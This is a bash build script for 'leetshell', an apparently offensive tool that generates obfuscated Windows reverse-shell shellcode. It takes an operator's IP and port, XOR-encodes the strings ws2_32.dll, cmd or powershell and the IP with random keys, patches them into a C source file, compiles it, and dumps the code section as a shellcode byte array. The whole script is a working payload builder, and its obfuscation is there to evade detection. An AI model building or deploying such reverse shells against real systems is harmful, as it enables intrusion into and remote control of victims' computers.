#!/bin/bash

echo "
[31m
██╗     ███████╗███████╗████████╗ ███████╗██╗  ██╗███████╗██╗     ██╗      
██║     ██╔════╝██╔════╝╚══██╔══╝ ██╔════╝██║  ██║██╔════╝██║     ██║ 
██║     █████╗  █████╗     ██║    ███████╗███████║█████╗  ██║     ██║      
██║     ██╔══╝  ██╔══╝     ██║    ╚════██║██╔══██║██╔══╝  ██║     ██║ 
███████╗███████╗███████╗   ██║    ███████║██║  ██║███████╗███████╗███████╗ 
╚══════╝╚══════╝╚══════╝   ╚═╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
[33m Copyright © 2025 jarednexgent (https://github.com/jarednexgent) [0m 
"

# === validate args ===
if [ $# -lt 2 ]; then
  echo "[!] Usage: $0 <ip> <port> [cmd|powershell] [--raw]"
  exit 1
fi

filename="src/leetshell.c"
ip=$1
port=$2
shell_type="cmd"
raw_output=false

# === parse optional args ===
for arg in "${@:3}"; do
  if [ "$arg" == "--raw" ]; then
    raw_output=true
  elif [ "$arg" == "cmd" ] || [ "$arg" == "powershell" ]; then
    shell_type="$arg"
  fi
done

len=${#ip}
lastChar=$((len - 1))

# === generate random XOR keys ===
xor_key1=$((RANDOM % 256))
xor_hex1=$(printf '0x%02x' $xor_key1)

xor_key2=$((RANDOM % 256))
xor_hex2=$(printf '0x%02x' $xor_key2)

xor_key3=$((RANDOM % 256))
xor_hex3=$(printf '0x%02x' $xor_key3)

# === Update KEY values defined in leetshell.c ===
sed -i "s/^#define KEY1.*/#define KEY1 $xor_hex1/" "$filename"
sed -i "s/^#define KEY2.*/#define KEY2 $xor_hex2/" "$filename"
sed -i "s/^#define KEY3.*/#define KEY3 $xor_hex3/" "$filename"

# === Update ws2_32.dll string ===
ws2="ws2_32.dll"
encoded_ws2="{"
for (( i=0; i<${#ws2}; i++ )); do
  byte=$(printf "%d" "'${ws2:$i:1}")
  xor_byte=$((byte ^ xor_key1))
  encoded_ws2+=$(printf "0x%02x, " $xor_byte)
done
encoded_ws2+=$(printf "0x%02x" $xor_key1)
encoded_ws2+="}"
sed -i "s/char ws2_32_dll\[\] = .*;/char ws2_32_dll[] = $encoded_ws2;/" "$filename"

# === Encode and update shell string ===
if [ "$shell_type" == "cmd" ]; then
  shell_str="cmd"
else
  shell_str="powershell"
fi

encoded_shell="{"
for (( i=0; i<${#shell_str}; i++ )); do
  byte=$(printf "%d" "'${shell_str:$i:1}")
  xor_byte=$((byte ^ xor_key2))
  encoded_shell+=$(printf "0x%02x, " $xor_byte)
done
encoded_shell+=$(printf "0x%02x" $xor_key2)
encoded_shell+="}"
sed -i "s/char cmd\[\] = .*;/char cmd[] = $encoded_shell;/" "$filename"

# === XOR encode IP ===
result="{"
for (( i=0; i<$len; i++ )); do
  char=${ip:$i:1}
  char_ord=$(printf '%d' "'$char")
  xor_result=$((char_ord ^ xor_key3))
  xor_char=$(printf '0x%02x' $xor_result)

  if [ $i -eq $lastChar ]; then
    result+="$xor_char"
  else
    result+="$xor_char,"
  fi
done
result+=$(printf ", 0x%02x}" $xor_key3)

# === patch IP and port ===
sed -i "s/char ip\[\] = .*;/char ip[] = $result;/g" "$filename"
sed -i "s/int port =.*;/int port = $port ;/g" "$filename"

# === build payload ===
make -C src leetshell > /dev/null 2>&1
if [ $? -ne 0 ]; then
  echo "[!] Build failed!"
  exit 1
fi

# === extract shellcode ===
objcopy -O binary --only-section=.text src/leetshell.exe shellcode.bin

# === handle output ===
if [ "$raw_output" = true ]; then
  echo "[+] Raw binary saved as shellcode.bin"
else
  echo "unsigned char buf[] = {"
  hexdump -v -e '16/1 "0x%02x, " "\n"' shellcode.bin | sed '$s/, $//'  # strip trailing comma
  echo "};"
  rm -f shellcode.bin
fi

# === clean up ===
rm -f src/leetshell.exe src/*.o
